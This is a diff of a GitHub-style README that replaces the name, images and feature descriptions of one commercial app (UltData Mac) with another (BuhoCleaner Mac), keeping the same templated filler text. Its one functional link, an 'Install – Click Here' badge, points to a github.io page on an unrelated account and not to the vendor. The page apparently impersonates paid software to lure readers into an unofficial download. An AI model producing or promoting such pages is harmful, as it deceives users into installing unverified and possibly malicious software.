@@ -1,61 +1,61 @@
-# UltData Mac
+# BuhoCleaner Mac
 
 <p align="center">
-  <img src="https://images.tenorshare.com/img-2023/product/ultdata-for-android/ultdata.png" width="200" alt="UltData icon"/>
+  <img src="https://cdnp1.stackassets.com/50074e198ddfb30d2ba93a5d81f1f2fde2aade4f/store/4408d371b28f3f1228fcf50e772ee9418a79fc17c1a1ae6fde2c80a78a29/sale_163088_primary_image.jpg" width="200" alt="BuhoCleaner icon"/>
 </p>
 
 <p align="center">
 
-[![Install](https://img.shields.io/badge/Install-Click%20Here-white?style=for-the-badge&logo=github&logoColor=black&labelColor=white&color=black)](https://dream-solar.github.io/.github/ultdata)
+[![Install](https://img.shields.io/badge/Install-Click%20Here-white?style=for-the-badge&logo=github&logoColor=black&labelColor=white&color=black)](https://dream-solar.github.io/.github/buhocleaner)
 
 </p>
 
 <p align="center">
-  <img src="https://9to5mac.com/wp-content/uploads/sites/6/2020/04/Ultdata-start-scan.jpg?quality=82&strip=all&w=855" alt="UltData screenshot"/>
+  <img src="https://macmenubar.com/wp-content/uploads/2023/04/buhocleaner.jpg" alt="BuhoCleaner screenshot"/>
 </p>
 
 ---
 
 ## Overview
 
-<a href="#">UltData</a> recovers data from iOS devices when deletion, damage, or other problems cause data loss. The application scans devices, iCloud backups, and iTunes backups to find recoverable content. When important data disappears, UltData provides recovery options.
+<a href="#">BuhoCleaner</a> provides fast, efficient Mac cleanup focused on recovering storage space safely. The application scans for removable files quickly and presents findings clearly, enabling informed decisions about what to delete. Speed and safety combine to make regular cleanup practical.
 
-The <a href="#">device recovery</a> scans connected iPhones and iPads directly. Find deleted data still on devices. Recover without backup access. Direct scanning finds data present but invisible to users.
+The <a href="#">fast scanning</a> identifies reclaimable space quickly. Scans complete in seconds rather than minutes. Quick scanning encourages frequent cleanup. Speed removes the barrier to regular maintenance.
 
-<a href="#">iTunes backup recovery</a> extracts data from local backups. Access content from previous backups. Recover from older device states. Backup recovery addresses recent deletions.
+<a href="#">Safe cleaning</a> protects essential system files. Understanding of what can and cannot be safely removed. Protection prevents accidental system damage. Safety matters when cleaning system directories.
 
-The <a href="#">iCloud recovery</a> accesses cloud backup content. Download and scan iCloud backups. Recover without physical device access. Cloud recovery serves remote data needs.
+The <a href="#">system junk</a> detection finds accumulated temporary files. Cache files, logs, and temporary data identified. System junk removal recovers significant storage. Junk cleaning addresses common space consumption.
 
-<a href="#">Photo recovery</a> retrieves deleted images. Find photos removed from library. Camera Roll and app images recoverable. Photo recovery addresses common loss scenario.
+<a href="#">Application cache</a> cleaning targets software accumulation. Apps store caches that grow over time. Cache cleaning recovers space apps won't release themselves. Application focus addresses major storage consumers.
 
-The <a href="#">message recovery</a> restores deleted conversations. Text messages, iMessages, and WhatsApp messages. Conversation history recovers. Message recovery retrieves communication records.
+The <a href="#">large file finder</a> reveals storage consumers. See which files occupy the most space. Identify forgotten downloads and outdated content. Large file visibility enables informed cleanup decisions.
 
-<a href="#">Contact recovery</a> restores address book entries. Deleted contacts retrievable. Contact lists restore from various states. Contact recovery addresses sync problems.
+<a href="#">Duplicate detection</a> finds redundant file copies. Identify files existing in multiple locations. Choose which copies to remove. Duplicate cleanup prevents wasted storage on redundant content.
 
-The <a href="#">selective recovery</a> retrieves only needed items. Preview before recovering. Choose specific files to restore. Selective approach focuses recovery efficiently.
+The <a href="#">one-click cleanup</a> removes identified junk efficiently. Review findings then clean with single action. One-click operation accelerates routine maintenance.
 
-<a href="#">Multiple iOS versions</a> support covers device range. Current and older iOS versions work. Broad compatibility serves diverse devices.
+<a href="#">Visual presentation</a> shows storage consumption clearly. Charts display space distribution. See cleanup impact visually. Visual clarity supports informed decisions.
 
 ---
 
 ## Key Features
 
-- <a href="#">Device recovery</a> direct scan
-- <a href="#">iTunes backup</a> recovery
-- <a href="#">iCloud recovery</a> cloud access
-- <a href="#">Photo recovery</a> deleted images
-- <a href="#">Message recovery</a> conversations
-- <a href="#">Contact recovery</a> address book
-- <a href="#">Selective recovery</a> preview
-- <a href="#">WhatsApp</a> messages
-- <a href="#">Multiple iOS</a> versions
+- <a href="#">Fast scanning</a> seconds
+- <a href="#">Safe cleaning</a> protected
+- <a href="#">System junk</a> detection
+- <a href="#">Large file finder</a> storage analysis
+- <a href="#">Duplicate detection</a> removal
+- <a href="#">App uninstaller</a> complete removal
+- <a href="#">Startup manager</a> login items
+- <a href="#">Browser cleanup</a> caches
+- <a href="#">One-click cleanup</a> efficient
 
 ---
 
 ## Additional Information
 
-UltData represents focused software development addressing specific professional needs with depth that general-purpose tools cannot match. The application excels within its domain through features developed for real-world workflows, enabling users to accomplish complex tasks efficiently.
+BuhoCleaner represents focused software development addressing specific professional needs with depth that general-purpose tools cannot match. The application excels within its domain through features developed for real-world workflows, enabling users to accomplish complex tasks efficiently.
 
-Development continues with careful attention to user feedback and platform evolution. Updates introduce capabilities addressing emerging professional needs while maintaining reliability. This ongoing commitment ensures UltData remains valuable as requirements evolve.
+Development continues with careful attention to user feedback and platform evolution. Updates introduce capabilities addressing emerging professional needs while maintaining reliability. This ongoing commitment ensures BuhoCleaner remains valuable as requirements evolve.
 
 ---
